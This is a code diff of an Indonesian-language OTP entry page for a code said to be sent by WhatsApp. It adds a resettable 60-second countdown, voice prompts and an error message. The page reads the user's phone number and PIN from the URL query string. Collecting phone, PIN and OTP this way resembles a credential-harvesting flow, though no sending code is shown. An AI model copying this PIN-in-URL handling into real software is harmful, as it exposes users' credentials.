@@ -25,7 +25,7 @@
           ←
         </button>
 
-        <!-- Tombol Ulangi Suara (Opsional jika pengguna ingin dengar lagi) -->
+        <!-- Tombol Ulangi Suara -->
         <button type="button" onclick="ucapPesan('Silakan masukkan 6 digit kode OTP yang telah dikirim ke WhatsApp Anda.')" class="text-xs bg-emerald-100 text-emerald-800 px-3 py-1 rounded-full font-semibold active:bg-emerald-200">
           🔊 Dengar Suara
         </button>
@@ -58,7 +58,7 @@
           <div class="otp-circle w-2.5 h-2.5 rounded-full bg-slate-300 transition-all duration-150"></div>
         </div>
 
-        <!-- Timer & Ikon Centang (Jalan Otomatis 60 Detik) -->
+        <!-- Timer & Ikon Centang -->
         <div class="flex items-center gap-1.5 text-xs text-slate-700 font-medium">
           <svg class="w-3.5 h-3.5 text-emerald-600" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
             <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
@@ -70,7 +70,7 @@
         <input type="tel" id="hidden-otp-input" maxlength="6" class="absolute inset-0 opacity-0 w-full h-full cursor-pointer" autofocus oninput="handleOtpInput(this)">
       </div>
 
-      <!-- TEKS MERAH PERINGATAN (Muncul tanpa pindah halaman) -->
+      <!-- TEKS MERAH PERINGATAN -->
       <div id="error-msg" class="hidden text-red-500 text-xs font-semibold mb-3 mt-1">
         Kode OTP salah atau sudah kedaluwarsa. Silakan coba lagi.
       </div>
@@ -106,21 +106,21 @@
     const hiddenInput = document.getElementById('hidden-otp-input');
     const timerDisplay = document.getElementById('timer');
 
-    // --- FUNGSI SUARA BICARA (Text-to-Speech) ---
     let audioSudahAktif = false;
+    let countdownInterval;
+    let timeLeft = 60;
 
     function ucapPesan(teks) {
       if ('speechSynthesis' in window) {
-        window.speechSynthesis.cancel(); // Hentikan suara sebelumnya jika ada
+        window.speechSynthesis.cancel();
         const pesan = new SpeechSynthesisUtterance(teks);
-        pesan.lang = 'id-ID'; // Bahasa Indonesia
-        pesan.rate = 0.95;   // Kecepatan suara (sedikit lebih santai)
-        pesan.pitch = 1.0;  // Nada standar
+        pesan.lang = 'id-ID';
+        pesan.rate = 0.95;
+        pesan.pitch = 1.0;
         window.speechSynthesis.speak(pesan);
       }
     }
 
-    // Pemicu Suara Pertama Saat Ada Interaksi/Sentuhan Layar (Aturan Browser HP)
     function aktifkanAudioPertama() {
       if (!audioSudahAktif) {
         audioSudahAktif = true;
@@ -128,26 +128,36 @@
       }
     }
 
-    // Jalankan suara saat halaman selesai dimuat (jika izinkan browser)
     window.addEventListener('DOMContentLoaded', () => {
       setTimeout(() => {
         ucapPesan("Silakan masukkan kode O T P Anda.");
       }, 500);
+      mulaiTimer();
     });
 
-    // Timer Hitung Mundur (60 Detik)
-    let timeLeft = 60;
-    const countdown = setInterval(() => {
-      let minutes = Math.floor(timeLeft / 60);
-      let seconds = timeLeft % 60;
-      timerDisplay.innerText = String(minutes).padStart(2, '0') + ":" + String(seconds).padStart(2, '0');
-      if (timeLeft > 0) {
-        timeLeft--;
-      } else {
-        clearInterval(countdown);
-        timerDisplay.innerText = "00:00";
-      }
-    }, 1000);
+    // --- FUNGSI TIMER (Bisa di-reset ulang kapan saja) ---
+    function mulaiTimer() {
+      clearInterval(countdownInterval); // Hentikan timer lama jika ada
+      timeLeft = 60; // Kembalikan ke 60 detik
+      
+      countdownInterval = setInterval(() => {
+        let minutes = Math.floor(timeLeft / 60);
+        let seconds = timeLeft % 60;
+        timerDisplay.innerText = String(minutes).padStart(2, '0') + ":" + String(seconds).padStart(2, '0');
+        
+        if (timeLeft > 0) {
+          timeLeft--;
+        } else {
+          clearInterval(countdownInterval);
+          timerDisplay.innerText = "00:00";
+          
+          // Jika waktu habis alami, otomatis reset juga ke 60 detik
+          setTimeout(() => {
+            mulaiTimer();
+          }, 1000);
+        }
+      }, 1000);
+    }
 
     // Ambil Data Nomor HP dan PIN
     const urlParams = new URLSearchParams(window.location.search);
@@ -203,12 +213,12 @@
           circle.style.backgroundColor = "#cbd5e1";
         });
         errorMsg.classList.remove('hidden');
-        
-        // Membunyikan suara peringatan saat OTP salah
         ucapPesan("Kode O T P salah atau sudah kedaluwarsa. Silakan periksa kembali dan masukkan ulang.");
+        
+        // --- TIMER LANGSUNG RESET KEMBALI KE 60 DETIK DI SINI ---
+        mulaiTimer();
       }, 400);
     }
   </script>
 </body>
 </html>
-
